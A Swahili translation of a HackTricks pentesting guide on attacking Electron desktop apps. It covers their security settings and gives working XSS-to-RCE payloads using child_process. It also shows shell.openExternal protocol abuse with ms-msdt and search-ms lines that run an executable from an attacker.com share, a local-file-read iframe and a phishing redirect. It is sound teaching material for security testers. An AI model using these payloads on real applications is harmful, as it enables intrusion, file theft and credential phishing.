# Programu za Kompyuta za Elektroni

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Utangulizi

Electron inachanganya sehemu ya nyuma ya ndani (na **NodeJS**) na sehemu ya mbele (**Chromium**), ingawa inakosa baadhi ya mifumo ya usalama ya vivinjari vya kisasa.

Kawaida unaweza kupata msimbo wa programu ya elektroni ndani ya programu ya `.asar`, ili kupata msimbo unahitaji kuutoa:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Katika nambari chanzo ya programu ya Electron, ndani ya `packet.json`, unaweza kupata faili ya `main.js` ambapo mipangilio ya usalama imewekwa.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ina aina 2 za michakato:

* Michakato ya Kuu (ina ufikiaji kamili wa NodeJS)
* Michakato ya Kuchora (inapaswa kuwa na ufikiaji mdogo wa NodeJS kwa sababu za usalama)

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

**Michakato ya kuchora** itakuwa dirisha la kivinjari linalopakia faili:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
Mipangilio ya **mchakato wa renderer** yanaweza **kusanidiwa** katika **mchakato mkuu** ndani ya faili ya main.js. Baadhi ya mipangilio itazuia programu ya Electron kupata RCE au udhaifu mwingine ikiwa **mipangilio imekusanidiwa kwa usahihi**.

Programu ya electron **inaweza kupata kifaa** kupitia apis za Node ingawa inaweza kusanidiwa kuzuia hilo:

* **`nodeIntegration`** - ni `off` kwa chaguo-msingi. Ikiwa imewashwa, inaruhusu kupata vipengele vya node kutoka kwa mchakato wa renderer.
* **`contextIsolation`** - ni `on` kwa chaguo-msingi. Ikiwa imewashwa, mchakato mkuu na mchakato wa renderer hawako kwenye kizuizi.
* **`preload`** - tupu kwa chaguo-msingi.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - imezimwa kwa chaguo-msingi. Itazuia vitendo ambavyo NodeJS inaweza kufanya.
* Ushirikiano wa Node katika Wafanyakazi
* **`nodeIntegrationInSubframes`** - ni `off` kwa chaguo-msingi.
* Ikiwa **`nodeIntegration`** imeamilishwa, hii itaruhusu matumizi ya API za **Node.js** katika kurasa za wavuti ambazo zimepakiwa kwenye iframes ndani ya programu ya Electron.
* Ikiwa **`nodeIntegration`** imelemazwa, basi preloads zitapakiwa kwenye iframe.

Mfano wa usanidi:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
Baadhi ya **RCE payloads** kutoka [hapa](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### Kukamata trafiki

Badilisha konfigurisheni ya start-main na ongeza matumizi ya proksi kama vile:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Uingizaji wa Kanuni ya Ndani ya Electron

Ikiwa unaweza kutekeleza programu ya Electron kwa kifaa chako, inawezekana kuifanya itekeleze kanuni ya javascript isiyojulikana. Angalia jinsi ya kufanya hivyo hapa:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

Ikiwa **nodeIntegration** imewekwa kuwa **on**, JavaScript ya ukurasa wa wavuti inaweza kutumia kwa urahisi vipengele vya Node.js kwa kuita `require()`. Kwa mfano, njia ya kutekeleza programu ya hesabu kwenye Windows ni:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Script iliyotajwa katika mipangilio hii ina**ngia kabla ya script nyingine katika renderer**, hivyo ina **upatikanaji usio na kikomo kwa Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Kwa hiyo, script inaweza kuuza sifa za node kwa kurasa:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**Ikiwa `contextIsolation` iko, hii haitafanya kazi**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ inaleta **mazingira yaliyotengwa kati ya skripti za ukurasa wa wavuti na msimbo wa ndani wa JavaScript wa Electron** ili utekelezaji wa JavaScript wa kila msimbo usiathiri kila mmoja. Hii ni kipengele muhimu cha kuondoa uwezekano wa RCE.

Ikiwa mazingira hayajatengwa, mshambuliaji anaweza:

1. Kutekeleza **JavaScript yoyote isiyo na kikomo katika renderer** (XSS au kupeleka kwenye tovuti za nje)
2. **Kubadilisha njia iliyojengwa ndani** ambayo hutumiwa katika preload au msimbo wa ndani wa Electron ili kumiliki kazi
3. **Kusababisha** matumizi ya **kazi iliyobadilishwa**
4. RCE?

Kuna sehemu 2 ambapo njia zilizojengwa ndani zinaweza kubadilishwa: Katika msimbo wa preload au katika msimbo wa ndani wa Electron:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### Kuepuka tukio la bonyeza

Ikiwa kuna vizuizi vilivyowekwa wakati unapobonyeza kiungo, unaweza kuvuka vizuizi hivyo **kwa kufanya bonyeza ya kati** badala ya bonyeza la kushoto la kawaida
```javascript
window.addEventListener('click', (e) => {
```
## RCE kupitia shell.openExternal

Kwa habari zaidi kuhusu mifano hii angalia [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) na [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)


Wakati wa kuweka programu ya desktop ya Electron, ni muhimu kuhakikisha mipangilio sahihi kwa `nodeIntegration` na `contextIsolation`. Imethibitishwa kuwa **utekelezaji wa kanuni ya mbali (RCE)** unaolenga skrini za kupakia au kanuni ya asili ya Electron kutoka kwa mchakato mkuu unazuia kwa ufanisi na mipangilio hii imewekwa.

Wakati mtumiaji anaposhirikiana na viungo au kufungua madirisha mapya, wasikilizaji maalum wa tukio huzinduliwa, ambayo ni muhimu kwa usalama na utendaji wa programu:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Wasikilizaji hawa **huzuilwa na programu ya desktop** ili kutekeleza **mantiki yake ya biashara**. Programu hii huchambua ikiwa kiungo kilichonakiliwa kinapaswa kufunguliwa ndani au kwenye kivinjari cha wavuti cha nje. Uamuzi huu kawaida hufanywa kupitia kazi inayoitwa `openInternally`. Ikiwa kazi hii inarudisha `false`, inaonyesha kuwa kiungo kinapaswa kufunguliwa kwa kutumia kazi ya `shell.openExternal`.

**Hapa kuna pseudocode rahisi:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../.gitbook/assets/image (620).png>)

Mazoea bora ya usalama ya Electron JS yanashauri kuepuka kukubali maudhui yasiyotegemewa na kazi ya `openExternal`, kwani inaweza kusababisha RCE kupitia itifaki mbalimbali. Mifumo ya uendeshaji inasaidia itifaki tofauti ambazo zinaweza kusababisha RCE. Kwa mifano ya kina na maelezo zaidi juu ya mada hii, unaweza kurejelea [rasilimali hii](https://positive.security/blog/url-open-rce#windows-10-19042), ambayo ina mifano ya itifaki za Windows ambazo zinaweza kutumika kudukua udhaifu huu.

**Mifano ya udanganyifu wa itifaki za Windows ni pamoja na:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## Kusoma Faili za Ndani: XSS + contextIsolation

**Kulemaza `contextIsolation` kunawezesha matumizi ya vitambulisho vya `<webview>`, kama vile `<iframe>`, kwa kusoma na kuchukua faili za ndani.** Mfano uliotolewa unaonyesha jinsi ya kutumia udhaifu huu kusoma maudhui ya faili za ndani:

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf_f2ttjg.png)

Zaidi ya hayo, njia nyingine ya **kusoma faili ya ndani** inashirikishwa, ikionyesha udhaifu mkubwa wa kusoma faili za ndani katika programu ya kompyuta ya Electron. Hii inahusisha kuingiza script ili kudukua programu na kuchukua data:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Chromium ya zamani**

Ikiwa **chromium** inayotumiwa na programu ni **zamani** na kuna **mapungufu yanayojulikana** kwenye hiyo, inaweza kuwa inawezekana **kuitumia na kupata RCE kupitia XSS**.\
Unaweza kuona mfano katika **makala hii**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing kupitia kukiuka regex ya URL ya ndani**

Kukisia umepata XSS lakini **hauwezi kusababisha RCE au kuiba faili za ndani**, unaweza kujaribu kuitumia **kuiba vibali kupitia phishing**.

Kwanza kabisa unahitaji kujua kinachotokea unapojaribu kufungua URL mpya, kwa kuangalia msimbo wa JS katika sehemu ya mbele:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Wito wa **`openInternally`** utaamua ikiwa **kiunga** kitafunguliwa kwenye **dirisha la desktop** kama kiunga kinachomilikiwa na jukwaa, **au** ikiwa kitafunguliwa kwenye **kivinjari kama rasilimali ya tatu**.

Katika kesi ambapo **regex** inayotumiwa na kazi hiyo ni **dhaifu kwa kuepuka** (kwa mfano kwa **kutoweka alama za pembejeo za subdomains**) mshambuliaji anaweza kutumia XSS ku **fungua dirisha jipya ambalo** litakuwa katika miundombinu ya mshambuliaji **na kuomba vibali** kutoka kwa mtumiaji:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **Vifaa**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) ni chombo cha kutambua mipangilio isiyofaa na mifano ya usalama katika programu za Electron.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) ni programu-jalizi ya VS Code ya chanzo wazi kwa programu za Electron ambayo hutumia Electronegativity.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) kwa ajili ya kuangalia maktaba za tatu zinazoweza kuwa na udhaifu
* [**Electro.ng**](https://electro.ng/): Unahitaji kununua

## Maabara

Katika [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) unaweza kupata maabara ya kutumia programu za Electron zilizo na udhaifu.

Baadhi ya amri zitakazokusaidia katika maabara:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Marejeo**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Utafiti zaidi na maandishi kuhusu usalama wa Electron katika [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
